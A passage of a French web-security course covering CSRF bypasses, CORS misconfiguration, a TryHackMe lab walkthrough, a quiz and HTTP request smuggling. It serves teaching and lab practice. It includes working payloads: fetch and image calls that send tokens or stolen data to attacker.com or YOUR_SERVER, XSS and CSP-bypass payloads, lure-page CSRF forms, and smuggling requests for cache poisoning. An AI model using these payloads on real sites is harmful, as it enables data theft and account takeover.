       const doc = parser.parseFromString(html, 'text/html');
       const token = doc.querySelector('input[name="csrf_token"]').value;
       // Envoyer le token à l'attaquant
       fetch('https://attacker.com/steal?token=' + token);
     });
   ```

2. **Fixation de jeton** :
   Si le serveur accepte un jeton fourni par l'utilisateur sans le valider.

3. **Requêtes GET non protégées** :
   Certaines applications n'appliquent pas la protection CSRF sur les requêtes GET.

##### Contournement de la vérification du Referer

1. **Absence d'en-tête Referer** :
   Certains proxys ou configurations de navigateur suppriment l'en-tête Referer.

2. **Vérification partielle** :
   ```php
   // Vérification vulnérable
   if (strpos($referer, 'bank.com') !== false) { // Vulnérable
       // Autorise https://attacker.com/bank.com
   }
   ```

##### Contournement de SameSite

1. **Attaques on-site** :
   SameSite protège contre les attaques cross-site, mais pas contre les attaques sur le même site (comme XSS).

2. **Navigateurs anciens** :
   Les navigateurs qui ne supportent pas SameSite restent vulnérables.

3. **Techniques de contournement spécifiques** :
   - Utilisation de sous-domaines (selon la définition de "même site")
   - Exploitation de redirections sur le site cible

#### Détection des vulnérabilités CSRF

##### Tests manuels

1. **Identifier les actions sensibles** :
   - Transferts d'argent
   - Modifications de profil
   - Changements de mot de passe

2. **Vérifier les protections** :
   - Présence de jetons CSRF
   - Vérification du Referer
   - Attribut SameSite des cookies

3. **Créer une preuve de concept** :
   ```html
   <html>
     <body>
       <form id="csrf-form" action="https://target.com/transfer" method="POST">
         <input type="hidden" name="amount" value="1000" />
         <input type="hidden" name="recipient" value="attacker" />
       </form>
       <script>
         document.getElementById("csrf-form").submit();
       </script>
     </body>
   </html>
   ```

##### Outils automatisés

```bash
# OWASP ZAP CSRF Scanner
# Burp Suite CSRF Scanner (Pro)

# Utilisation de scripts personnalisés
python3 csrf_tester.py --url https://target.com --action /transfer
```

#### Implémentation de protections robustes

##### Combinaison de protections

La meilleure approche est de combiner plusieurs méthodes de protection :

```php
// PHP - Protection CSRF complète
function csrf_protection() {
    // 1. Vérifier le jeton CSRF
    $token = $_POST['csrf_token'] ?? '';
    if (!hash_equals($_SESSION['csrf_token'], $token)) {
        die("CSRF détecté: jeton invalide");
    }
    
    // 2. Vérifier l'en-tête Referer
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $allowed_domain = 'https://bank.com';
    if (strpos($referer, $allowed_domain) !== 0) {
        die("CSRF détecté: referer invalide");
    }
    
    // 3. Utiliser SameSite pour les cookies
    session_start([
        'cookie_samesite' => 'Lax',
        'cookie_secure' => true,
        'cookie_httponly' => true
    ]);
}
```

##### Framework-specific implementations

1. **Express.js (Node.js)** :
   ```javascript
   const csrf = require('csurf');
   const cookieParser = require('cookie-parser');
   
   app.use(cookieParser());
   app.use(csrf({ cookie: { 
     sameSite: 'lax',
     secure: true
   }}));
   
   app.get('/form', (req, res) => {
     res.render('form', { csrfToken: req.csrfToken() });
   });
   ```

2. **Django (Python)** :
   ```python
   # settings.py
   MIDDLEWARE = [
       'django.middleware.csrf.CsrfViewMiddleware',
       # ...
   ]
   
   # Dans les templates
   <form method="post">
       {% csrf_token %}
       <!-- champs du formulaire -->
   </form>
   ```

3. **Spring (Java)** :
   ```java
   @EnableWebSecurity
   public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
       @Override
       protected void configure(HttpSecurity http) throws Exception {
           http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
       }
   }
   ```

**En clair, pour un débutant :**
Le CSRF, c'est comme si quelqu'un vous faisait signer un chèque les yeux bandés. Vous êtes authentifié sur votre banque en ligne, puis vous visitez un site malveillant qui déclenche automatiquement une action sur votre banque (comme un transfert d'argent). Votre navigateur envoie vos cookies d'authentification avec la requête, et la banque pense que c'est vous qui avez initié l'action. Les protections traditionnelles incluent des "jetons anti-CSRF" (comme un code secret unique pour chaque formulaire) et la vérification du Referer (d'où vient la requête). L'attribut SameSite des cookies est une protection moderne qui empêche vos cookies d'être envoyés lors de requêtes provenant d'autres sites, bloquant ainsi la plupart des attaques CSRF.

### CORS & SOP misconfig

Les mauvaises configurations de la politique de même origine (Same-Origin Policy ou SOP) et du partage de ressources entre origines (Cross-Origin Resource Sharing ou CORS) peuvent exposer les applications web à diverses vulnérabilités.

#### Politique de même origine (SOP)

La politique de même origine est un mécanisme de sécurité fondamental qui restreint la façon dont un document ou un script d'une origine peut interagir avec les ressources d'une autre origine.

##### Définition d'une "origine"

Une origine est définie par la combinaison du protocole, du domaine et du port :
```
https://example.com:443
└─┬─┘ └────┬────┘ └─┬─┘
protocole  domaine   port
```

Exemples d'origines différentes :
- `https://example.com` vs `http://example.com` (protocoles différents)
- `https://example.com` vs `https://sub.example.com` (domaines différents)
- `https://example.com` vs `https://example.com:8080` (ports différents)

##### Restrictions imposées par SOP

La SOP empêche un script d'une origine d'accéder aux données d'une autre origine. Spécifiquement :

1. **Lecture de ressources cross-origin** : Interdite (ex: AJAX, fetch)
2. **Écriture cross-origin** : Généralement autorisée (ex: formulaires, redirections)
3. **Intégration cross-origin** : Partiellement autorisée (ex: images, scripts, iframes avec restrictions)

```javascript
// Exemple de restriction SOP
// Si le script est sur https://site-a.com
fetch('https://site-b.com/api/data')
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Erreur SOP:', error));
// Résultat: Erreur CORS bloquée par le navigateur
```

#### Cross-Origin Resource Sharing (CORS)

CORS est un mécanisme qui permet à un serveur de spécifier quelles origines, autres que la sienne, sont autorisées à accéder à ses ressources.

##### En-têtes CORS de base

1. **Access-Control-Allow-Origin** :
   Spécifie quelles origines peuvent accéder à la ressource.
   ```
   Access-Control-Allow-Origin: https://trusted-site.com
   Access-Control-Allow-Origin: * (toutes les origines)
   ```

2. **Access-Control-Allow-Methods** :
   Spécifie les méthodes HTTP autorisées.
   ```
   Access-Control-Allow-Methods: GET, POST, PUT
   ```

3. **Access-Control-Allow-Headers** :
   Spécifie les en-têtes HTTP qui peuvent être utilisés.
   ```
   Access-Control-Allow-Headers: Content-Type, Authorization
   ```

4. **Access-Control-Allow-Credentials** :
   Indique si la requête peut inclure des informations d'authentification (cookies, en-têtes HTTP d'authentification).
   ```
   Access-Control-Allow-Credentials: true
   ```

##### Requêtes préliminaires (preflight)

Pour les requêtes complexes (non-simples), le navigateur envoie d'abord une requête OPTIONS pour vérifier si la requête réelle est autorisée.

```
OPTIONS /api/data HTTP/1.1
Host: site-b.com
Origin: https://site-a.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, X-Custom-Header
```

Réponse du serveur :
```
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://site-a.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type, X-Custom-Header
Access-Control-Max-Age: 86400
```

#### Vulnérabilités liées aux mauvaises configurations CORS

##### Configuration trop permissive

1. **Utilisation de wildcard avec credentials** :
   ```
   # Configuration dangereuse
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Credentials: true
   ```
   Cette configuration est rejetée par les navigateurs car elle présente un risque de sécurité.

2. **Validation d'origine basée sur la présence d'un sous-domaine** :
   ```php
   // PHP - Validation vulnérable
   $origin = $_SERVER['HTTP_ORIGIN'];
   if (strpos($origin, 'example.com') !== false) {
       header("Access-Control-Allow-Origin: $origin");
       header("Access-Control-Allow-Credentials: true");
   }
   ```
   Cette validation accepterait `malicious-example.com` comme origine valide.

##### Reflection d'origine sans validation

```php
// PHP - Reflection d'origine sans validation
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
header("Access-Control-Allow-Origin: $origin");
header("Access-Control-Allow-Credentials: true");
```

Cette configuration accepte n'importe quelle origine et permet l'envoi de cookies, exposant potentiellement des données sensibles.

##### Exploitation d'une mauvaise configuration CORS

```html
<!-- Exploitation d'une configuration CORS vulnérable -->
<script>
  fetch('https://vulnerable-site.com/api/user-data', {
    method: 'GET',
    credentials: 'include' // Envoie les cookies
  })
  .then(response => response.json())
  .then(data => {
    // Envoyer les données volées à l'attaquant
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

Si le serveur vulnérable accepte l'origine `attacker.com` et permet les credentials, cette attaque peut voler des données sensibles.

#### Techniques d'exploitation avancées

##### Contournement de validation d'origine

1. **Exploitation de sous-domaines** :
   Si l'application accepte tous les sous-domaines de `example.com`, un attaquant pourrait créer `attacker.example.com` s'il peut contrôler un sous-domaine.

2. **Exploitation de validation partielle** :
   ```php
   // Validation vulnérable
   if (preg_match('/^https:\/\/trusted-site\.com/', $origin)) {
       header("Access-Control-Allow-Origin: $origin");
   }
   ```
   Cette validation accepterait `https://trusted-site.com.attacker.com`.

3. **Exploitation de null origin** :
   ```php
   // Validation vulnérable
   if ($origin === 'null') {
       header("Access-Control-Allow-Origin: null");
       header("Access-Control-Allow-Credentials: true");
   }
   ```
   L'origine `null` peut être déclenchée via une iframe sandbox ou un fichier HTML local.

##### Exploitation via XSS

Si un site a une vulnérabilité XSS, la SOP et CORS peuvent être contournés car le code malveillant s'exécute dans le contexte de l'origine vulnérable.

```html
<!-- Exploitation via XSS -->
<script>
  // Ce code s'exécute dans le contexte de vulnerable-site.com
  fetch('/api/sensitive-data')
    .then(response => response.json())
    .then(data => {
      // Exfiltration des données
      new Image().src = 'https://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(data));
    });
</script>
```

##### Attaques de type CSRF avancées

Même avec des restrictions CORS, certaines actions peuvent être déclenchées via CSRF si le site n'implémente pas de protection CSRF adéquate.

```html
<!-- Attaque CSRF malgré CORS -->
<form id="csrf-form" action="https://vulnerable-site.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
```

#### Détection des vulnérabilités CORS

##### Tests manuels

1. **Tester la reflection d'origine** :
   ```
   # Requête avec une origine arbitraire
   GET /api/data HTTP/1.1
   Host: vulnerable-site.com
   Origin: https://attacker.com
   
   # Vérifier si la réponse contient
   Access-Control-Allow-Origin: https://attacker.com
   Access-Control-Allow-Credentials: true
   ```

2. **Tester les validations partielles** :
   ```
   # Tester différentes variations
   Origin: https://vulnerable-site.com.attacker.com
   Origin: https://vulnerable-site.attacker.com
   Origin: https://attackervulnerable-site.com
   ```

3. **Tester l'origine null** :
   ```
   Origin: null
   ```

##### Outils automatisés

```bash
# CORStest
git clone https://github.com/RUB-NDS/CORStest.git
cd CORStest
python3 corstest.py -u https://vulnerable-site.com

# Corsy
git clone https://github.com/s0md3v/Corsy.git
cd Corsy
python3 corsy.py -u https://vulnerable-site.com
```

#### Implémentation sécurisée de CORS

##### Bonnes pratiques

1. **Spécifier des origines précises** :
   ```
   # Au lieu de wildcard
   Access-Control-Allow-Origin: https://trusted-site.com
   ```

2. **Validation stricte des origines** :
   ```php
   // PHP - Validation sécurisée
   $allowed_origins = [
       'https://trusted-site.com',
       'https://app.trusted-site.com'
   ];
   
   $origin = $_SERVER['HTTP_ORIGIN'] ?? '';
   
   if (in_array($origin, $allowed_origins, true)) {
       header("Access-Control-Allow-Origin: $origin");
       header("Access-Control-Allow-Credentials: true");
   }
   ```

3. **Limiter les méthodes et en-têtes** :
   ```
   Access-Control-Allow-Methods: GET, POST
   Access-Control-Allow-Headers: Content-Type, Authorization
   ```

4. **Éviter d'exposer des en-têtes sensibles** :
   ```
   Access-Control-Expose-Headers: Content-Length, X-Request-ID
   ```

5. **Limiter la durée de validité du preflight** :
   ```
   Access-Control-Max-Age: 3600 # 1 heure
   ```

##### Implémentations par framework

1. **Express.js (Node.js)** :
   ```javascript
   const cors = require('cors');
   
   const corsOptions = {
     origin: ['https://trusted-site.com', 'https://app.trusted-site.com'],
     methods: ['GET', 'POST'],
     allowedHeaders: ['Content-Type', 'Authorization'],
     credentials: true,
     maxAge: 3600
   };
   
   app.use(cors(corsOptions));
   ```

2. **Django (Python)** :
   ```python
   # settings.py
   CORS_ALLOWED_ORIGINS = [
       "https://trusted-site.com",
       "https://app.trusted-site.com",
   ]
   CORS_ALLOW_METHODS = ['GET', 'POST']
   CORS_ALLOW_HEADERS = ['Content-Type', 'Authorization']
   CORS_ALLOW_CREDENTIALS = True
   CORS_PREFLIGHT_MAX_AGE = 3600
   ```

3. **Spring (Java)** :
   ```java
   @Configuration
   public class CorsConfig implements WebMvcConfigurer {
       @Override
       public void addCorsMappings(CorsRegistry registry) {
           registry.addMapping("/api/**")
               .allowedOrigins("https://trusted-site.com", "https://app.trusted-site.com")
               .allowedMethods("GET", "POST")
               .allowedHeaders("Content-Type", "Authorization")
               .allowCredentials(true)
               .maxAge(3600);
       }
   }
   ```

**En clair, pour un débutant :**
La politique de même origine (SOP) est comme un garde-frontière du web qui empêche un site de lire les données d'un autre site. CORS est comme un système de visas qui permet à certains sites étrangers d'accéder à vos ressources. Une mauvaise configuration CORS, c'est comme donner un visa à n'importe qui sans vérification. Par exemple, si un site bancaire configure mal CORS en acceptant toutes les origines et en permettant l'envoi de cookies, un site malveillant pourrait faire des requêtes à la banque avec vos cookies d'authentification et voler vos données. Les erreurs courantes incluent la réflexion aveugle de l'origine (accepter n'importe quelle origine) et les validations partielles (comme accepter tout ce qui contient "example.com", y compris "malicious-example.com").

### Mini-lab THM « What's Your Name? »

Ce mini-lab vous guide à travers l'exploitation de diverses vulnérabilités côté client sur une machine TryHackMe.

#### Objectif

Explorer et exploiter différentes vulnérabilités côté client pour contourner des protections, exécuter du code JavaScript malveillant et récupérer des informations sensibles.

#### Préparation

1. **Accès à la machine** :
   - Connectez-vous à TryHackMe
   - Déployez la machine "What's Your Name?"
   - Notez l'adresse IP attribuée

2. **Configuration de l'environnement** :
   - Préparez Burp Suite pour l'interception
   - Configurez votre navigateur pour utiliser le proxy Burp

#### Partie 1 : Exploration de l'application

1. **Reconnaissance initiale** :
   ```bash
   # Scan de ports
   nmap -sC -sV -p- MACHINE_IP
   
   # Découverte de contenu web
   gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt
   ```

2. **Analyse manuelle** :
   - Accédez à l'application web via votre navigateur
   - Explorez les fonctionnalités disponibles
   - Examinez le code source pour comprendre le fonctionnement

3. **Identification des points d'entrée** :
   - Formulaires d'entrée utilisateur
   - Paramètres d'URL
   - Cookies et stockage local
   - Fonctionnalités AJAX

#### Partie 2 : Exploitation d'un XSS basé sur le DOM

1. **Identification de la vulnérabilité** :
   - Localisez un formulaire ou un paramètre qui reflète l'entrée utilisateur dans le DOM
   - Examinez le code JavaScript pour identifier comment l'entrée est traitée
   - Recherchez des fonctions dangereuses comme `innerHTML`, `document.write()`, ou `eval()`

2. **Test de base** :
   ```
   <script>alert(document.domain)</script>
   ```

3. **Contournement de filtres** :
   Si des filtres sont en place, essayez différentes techniques de contournement :
   ```
   <img src=x onerror=alert(document.domain)>
   <svg onload=alert(document.domain)>
   <body onload=alert(document.domain)>
   ```

4. **Exploitation** :
   - Créez un payload qui exfiltre des informations sensibles :
   ```html
   <script>
   fetch('/api/user-data')
     .then(response => response.json())
     .then(data => {
       fetch('https://YOUR_SERVER/steal?data=' + encodeURIComponent(JSON.stringify(data)))
     });
   </script>
   ```

5. **Configuration du serveur d'écoute** :
   ```bash
   # Sur votre machine d'attaque
   nc -lvnp 8000
   ```

#### Partie 3 : Contournement de CSP

1. **Analyse de la politique CSP** :
   - Examinez les en-têtes de réponse pour identifier la politique CSP
   ```bash
   curl -I http://MACHINE_IP
   ```

2. **Identification des faiblesses** :
   - Recherchez des sources permissives (CDN, domaines tiers)
   - Vérifiez si `unsafe-inline` ou `unsafe-eval` sont autorisés
   - Identifiez les endpoints JSONP potentiels

3. **Exploitation via CDN autorisé** :
   Si un CDN comme cdnjs.cloudflare.com est autorisé, recherchez des bibliothèques vulnérables :
   ```html
   <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script>
   <div ng-app ng-csp>{{constructor.constructor('alert(document.domain)')()}}</div>
   ```

4. **Exploitation via JSONP** :
   Si un endpoint JSONP est disponible sur un domaine autorisé :
   ```html
   <script src="https://trusted-domain.com/api/jsonp?callback=alert(document.domain)"></script>
   ```

#### Partie 4 : Exploitation CORS

1. **Test de la configuration CORS** :
   ```bash
   # Envoi d'une requête avec une origine arbitraire
   curl -H "Origin: https://attacker.com" -I http://MACHINE_IP/api/data
   ```

2. **Vérification de la réponse** :
   Recherchez les en-têtes suivants :
   ```
   Access-Control-Allow-Origin: https://attacker.com
   Access-Control-Allow-Credentials: true
   ```

3. **Création d'une preuve de concept** :
   ```html
   <!DOCTYPE html>
   <html>
   <head>
     <title>CORS Exploit</title>
   </head>
   <body>
     <h1>CORS Exploitation</h1>
     <div id="output"></div>
     <script>
       fetch('http://MACHINE_IP/api/sensitive-data', {
         method: 'GET',
         credentials: 'include'
       })
       .then(response => response.json())
       .then(data => {
         document.getElementById('output').innerText = JSON.stringify(data);
         // Exfiltration des données
         fetch('https://YOUR_SERVER/steal?data=' + encodeURIComponent(JSON.stringify(data)));
       })
       .catch(error => console.error('Error:', error));
     </script>
   </body>
   </html>
   ```

4. **Test de l'exploit** :
   - Hébergez la page d'exploitation sur votre serveur
   - Visitez la page depuis un navigateur authentifié sur l'application cible

#### Partie 5 : Exploitation CSRF

1. **Identification d'actions sensibles** :
   - Recherchez des fonctionnalités qui modifient l'état (changement de mot de passe, mise à jour de profil)
   - Vérifiez si des protections CSRF sont en place (jetons, vérification du Referer)

2. **Test de la protection SameSite** :
   - Examinez les cookies pour voir s'ils ont l'attribut SameSite
   ```bash
   # Vérification des cookies
   curl -I http://MACHINE_IP
   ```

3. **Création d'une preuve de concept CSRF** :
   ```html
   <!DOCTYPE html>
   <html>
   <body>
     <h1>Cliquez sur le bouton pour gagner un prix !</h1>
     <form id="csrf-form" action="http://MACHINE_IP/api/update-profile" method="POST">
       <input type="hidden" name="email" value="attacker@evil.com" />
       <input type="hidden" name="displayName" value="Hacked" />
     </form>
     <button onclick="document.getElementById('csrf-form').submit()">Gagner un prix !</button>
     <script>
       // Soumission automatique (optionnelle)
       // document.getElementById('csrf-form').submit();
     </script>
   </body>
   </html>
   ```

4. **Test de l'exploit** :
   - Hébergez la page d'exploitation sur votre serveur
   - Incitez un utilisateur authentifié à visiter la page

#### Partie 6 : Récupération des flags

1. **Flag DOM XSS** :
   - Exploitez la vulnérabilité XSS basée sur le DOM
   - Utilisez un payload qui accède au flag dans le DOM ou le localStorage
   ```javascript
   <img src=x onerror="alert(document.getElementById('flag').innerText)">
   ```

2. **Flag CSP Bypass** :
   - Contournez la politique CSP pour exécuter du JavaScript
   - Accédez au flag caché dans la page ou via une API
   ```javascript
   // Si le flag est dans une API protégée par CSP
   fetch('/api/flag').then(r=>r.text()).then(t=>fetch('https://YOUR_SERVER/flag?data='+encodeURIComponent(t)))
   ```

3. **Flag CORS** :
   - Exploitez la mauvaise configuration CORS pour accéder à des données sensibles
   - Le flag pourrait être dans une API accessible uniquement avec des credentials

4. **Flag CSRF** :
   - Exploitez une vulnérabilité CSRF pour déclencher une action qui révèle le flag
   - Vérifiez si une action spécifique débloque l'accès au flag

#### Rapport et réflexion

Pour chaque vulnérabilité exploitée, documentez :
1. La vulnérabilité identifiée
2. La méthode d'exploitation
3. L'impact dans un environnement réel
4. Les mesures de correction recommandées

**Exemple de rapport pour la partie 2 (DOM XSS) :**
```
Vulnérabilité : XSS basé sur le DOM
Méthode d'exploitation : Injection de balise <img> avec gestionnaire d'événement onerror dans le paramètre 'name'
Impact : Exécution de code JavaScript arbitraire dans le contexte de l'application, permettant le vol de cookies, la manipulation du DOM et l'exfiltration de données sensibles
Correction : Utiliser des méthodes sécurisées comme textContent au lieu de innerHTML, implémenter une validation stricte des entrées, utiliser des bibliothèques de sanitization comme DOMPurify
```

**En clair, pour un débutant :**
Ce mini-lab est comme un parcours d'obstacles centré sur les attaques côté client. Vous commencez par explorer l'application pour trouver des points faibles, puis vous exploitez un XSS basé sur le DOM pour exécuter votre propre code JavaScript dans le navigateur de la victime. Ensuite, vous contournez la politique de sécurité du contenu (CSP) qui est censée bloquer les scripts malveillants. Vous exploitez également une mauvaise configuration CORS pour accéder à des données sensibles depuis un autre site, et vous créez une attaque CSRF qui force l'utilisateur à effectuer des actions sans son consentement. C'est comme apprendre à trouver et exploiter différentes failles dans les défenses d'un château, mais du côté du navigateur plutôt que du serveur.

### Quiz

1. **Quelle méthode DOM est particulièrement vulnérable aux attaques XSS basées sur le DOM ?**
   - A) textContent
   - B) innerHTML
   - C) getAttribute
   - D) querySelector
   
   *Réponse : B) innerHTML*

2. **Quelle directive CSP permet d'autoriser l'exécution de scripts inline avec un attribut nonce spécifique ?**
   - A) script-src 'unsafe-inline'
   - B) script-src 'nonce-random123'
   - C) script-src 'self'
   - D) script-src 'unsafe-eval'
   
   *Réponse : B) script-src 'nonce-random123'*

3. **Quelle valeur de l'attribut SameSite des cookies offre la meilleure protection contre les attaques CSRF ?**
   - A) None
   - B) Lax
   - C) Strict
   - D) Default
   
   *Réponse : C) Strict*

4. **Quelle configuration CORS est particulièrement dangereuse lorsqu'elle est utilisée avec des cookies d'authentification ?**
   - A) Access-Control-Allow-Origin: *
   - B) Access-Control-Allow-Methods: GET, POST
   - C) Access-Control-Allow-Origin: https://trusted-site.com
   - D) Access-Control-Max-Age: 3600
   
   *Réponse : A) Access-Control-Allow-Origin: **

5. **Quelle technique permet de contourner une politique CSP qui n'autorise que des domaines spécifiques pour les scripts ?**
   - A) Utilisation de balises <script> inline
   - B) Exploitation d'un endpoint JSONP sur un domaine autorisé
   - C) Utilisation de JavaScript dans les attributs d'événement
   - D) Injection de code via innerHTML
   
   *Réponse : B) Exploitation d'un endpoint JSONP sur un domaine autorisé*
## PARTIE H — Spécial : HTTP Request Smuggling

### Comprendre HTTP Request Smuggling

Le HTTP Request Smuggling (contrebande de requêtes HTTP) est une technique d'attaque avancée qui exploite les incohérences dans la façon dont les serveurs web et les proxys interprètent les requêtes HTTP.

#### Principes fondamentaux

##### Architecture multi-serveurs

La plupart des applications web modernes utilisent une architecture à plusieurs niveaux :

```
Client <-> Serveur frontal (proxy/load balancer) <-> Serveur d'application
```

Le serveur frontal reçoit les requêtes des clients et les transmet au serveur d'application. Cette configuration crée un potentiel de désynchronisation.

##### Ambiguïtés dans la spécification HTTP

Le problème fondamental vient des différentes façons de spécifier la fin d'une requête HTTP :

1. **Content-Length** : Indique la longueur exacte du corps de la requête en octets
2. **Transfer-Encoding: chunked** : Le corps est envoyé en morceaux, chacun précédé de sa taille en hexadécimal

La spécification HTTP indique que si les deux en-têtes sont présents, `Transfer-Encoding: chunked` doit prévaloir. Cependant, tous les serveurs n'implémentent pas cette règle de la même manière.

#### Types de vulnérabilités

##### CL.TE (Content-Length / Transfer-Encoding)

Dans ce scénario :
- Le serveur frontal utilise `Content-Length`
- Le serveur d'application utilise `Transfer-Encoding: chunked`

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Le serveur frontal voit une requête de 13 octets, tandis que le serveur d'application voit une requête chunked qui se termine après "0\r\n\r\n" (le chunk de taille zéro). Le contenu "SMUGGLED" est alors interprété comme le début d'une nouvelle requête.

##### TE.CL (Transfer-Encoding / Content-Length)

Dans ce scénario :
- Le serveur frontal utilise `Transfer-Encoding: chunked`
- Le serveur d'application utilise `Content-Length`

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

Le serveur frontal voit une requête chunked complète, tandis que le serveur d'application utilise `Content-Length: 3` et ne lit que les 3 premiers octets du corps ("8\r\n"). Le reste ("SMUGGLED\r\n0\r\n\r\n") est interprété comme le début d'une nouvelle requête.

##### TE.TE (Transfer-Encoding / Transfer-Encoding)

Dans ce scénario, les deux serveurs utilisent `Transfer-Encoding: chunked`, mais l'un d'eux peut être trompé pour ne pas reconnaître l'en-tête :

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked
Transfer-encoding: chunked

8
SMUGGLED
0

```

Certains serveurs ne reconnaissent pas la deuxième variante de l'en-tête avec une casse différente.

#### Techniques d'exploitation avancées

##### Détection des vulnérabilités

1. **Technique du délai** :
   ```
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Content-Length: 6
   Transfer-Encoding: chunked

   0

   X
   ```
   
   Si le serveur attend plus de données après avoir reçu ce message, cela indique une vulnérabilité potentielle.

2. **Technique de l'erreur** :
   ```
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Content-Length: 11
   Transfer-Encoding: chunked

   1
   Z
   Q
   ```
   
   Le "Q" n'est pas un caractère hexadécimal valide pour la taille d'un chunk, ce qui devrait provoquer une erreur si le serveur utilise le chunked encoding.

##### Exploitation pour contourner les contrôles de sécurité

1. **Contournement de WAF/IDS** :
   
   Les systèmes de détection d'intrusion examinent généralement chaque requête individuellement. En utilisant le request smuggling, on peut diviser une charge utile malveillante entre deux requêtes pour éviter la détection.

   ```
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Content-Length: 60
   Transfer-Encoding: chunked

   0

   GET /admin HTTP/1.1
   X-Ignore: XGET /api/userHOST: vulnerable-website.com
   ```

2. **Empoisonnement de cache** :
   
   Si l'application utilise un cache, on peut empoisonner ce cache pour servir du contenu malveillant à d'autres utilisateurs.

   ```
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Content-Length: 63
   Transfer-Encoding: chunked

   0

   GET /home HTTP/1.1
   Host: vulnerable-website.com
   X-Malicious: true

   ```

   Cette attaque peut faire en sorte que le contenu malveillant soit mis en cache et servi à tous les utilisateurs qui visitent `/home`.

3. **Capture de requêtes d'autres utilisateurs** :
   
   On peut capturer les cookies ou les informations d'authentification d'autres utilisateurs.

   ```
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Content-Length: 65
   Transfer-Encoding: chunked

   0

   GET / HTTP/1.1
   Host: vulnerable-website.com
   Cookie: sessionid=STEAL

   ```

#### Variantes modernes et avancées

##### H2.0 Request Smuggling

HTTP/2 introduit de nouvelles possibilités de smuggling, notamment via la conversion HTTP/2 vers HTTP/1.1 :

```
:method: POST
:path: /
:authority: vulnerable-website.com
content-type: application/x-www-form-urlencoded
content-length: 0
transfer-encoding: chunked

10
SMUGGLED_CONTENT
0

```

Si le serveur frontal utilise HTTP/2 mais communique avec le backend en HTTP/1.1, des incohérences peuvent apparaître dans la conversion.

##### Exploitation via WebSockets

Les connexions WebSocket peuvent également être vulnérables au request smuggling :

```
GET / HTTP/1.1
Host: vulnerable-website.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Content-Length: 65
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Cookie: sessionid=123

```

##### Techniques d'obfuscation avancées

Pour contourner les protections, diverses techniques d'obfuscation peuvent être utilisées :

1. **Espaces dans les en-têtes** :
   ```
   Transfer-Encoding : chunked
   ```

2. **Caractères non standards** :
   ```
   Transfer-Encoding: chunked[0x0b]
   ```

3. **En-têtes dupliqués** :
   ```
   Transfer-Encoding: gzip
   Transfer-Encoding: chunked
   ```

4. **Encodage non standard des chunks** :
   ```
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Transfer-Encoding: chunked

   +3
   abc
   0
   ```

#### Outils de détection et d'exploitation

##### Burp Suite Professional

Burp Suite inclut un scanner de HTTP Request Smuggling :

1. Activer le scanner actif
2. Configurer les options de détection de Request Smuggling
3. Lancer un scan sur l'application cible

##### Outils spécialisés

```bash
# HTTP Request Smuggler
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://vulnerable-website.com

# Smuggling Discovery
git clone https://github.com/anshumanpattnaik/http-request-smuggling.git
cd http-request-smuggling
python3 smuggle.py -u https://vulnerable-website.com
```

#### Prévention et mitigation

##### Bonnes pratiques pour les développeurs

1. **Normalisation des en-têtes** :
   ```java
   // Java - Normalisation des en-têtes
   String transferEncoding = request.getHeader("Transfer-Encoding");
   if (transferEncoding != null && transferEncoding.equalsIgnoreCase("chunked")) {
       // Traiter comme chunked
   }
   ```

2. **Cohérence dans le traitement des requêtes** :
   Assurez-vous que tous les serveurs de la chaîne utilisent la même logique pour interpréter les requêtes.

3. **Validation stricte des requêtes** :
   ```python
   # Python - Validation stricte
   if "Transfer-Encoding" in request.headers and "Content-Length" in request.headers:
       return Response("Invalid request: both Transfer-Encoding and Content-Length present", status=400)
   ```

##### Configuration des serveurs

1. **Apache** :
   ```
   # Désactiver le chunked encoding si non nécessaire
   SetEnv no-chunked-encoding
   
   # Limiter la taille des requêtes
   LimitRequestBody 1048576
   ```

2. **Nginx** :
   ```
   # Limiter la taille du corps
   client_max_body_size 1m;
   
   # Configurer les timeouts
   client_body_timeout 10s;
   client_header_timeout 10s;
   ```

3. **HAProxy** :
   ```
   # Normaliser les en-têtes HTTP
   http-request normalize-uri
   
   # Vérifier la cohérence des requêtes
   http-request deny if { req.hdr(Content-Length) -m found } { req.hdr(Transfer-Encoding) -m found }
   ```

**En clair, pour un débutant :**
Le HTTP Request Smuggling, c'est comme si vous envoyiez un message ambigu à deux personnes qui l'interprètent différemment. Imaginez que vous écriviez une lettre avec deux indications contradictoires sur sa longueur : "Cette lettre fait 10 mots" alors qu'elle en contient 20. Le premier facteur lit les 10 premiers mots et pense avoir fini, tandis que le second lit tout et considère les 10 derniers mots comme le début d'une nouvelle lettre. Dans le monde web, cette confusion entre serveurs frontaux et d'application permet d'injecter des requêtes "clandestines" qui peuvent contourner des sécurités, voler des informations ou empoisonner des caches. C'est particulièrement dangereux car ces attaques sont difficiles à détecter et peuvent affecter d'autres utilisateurs.

### Quick Ops (Cheatsheet)

#### Commandes essentielles pour le pentest web

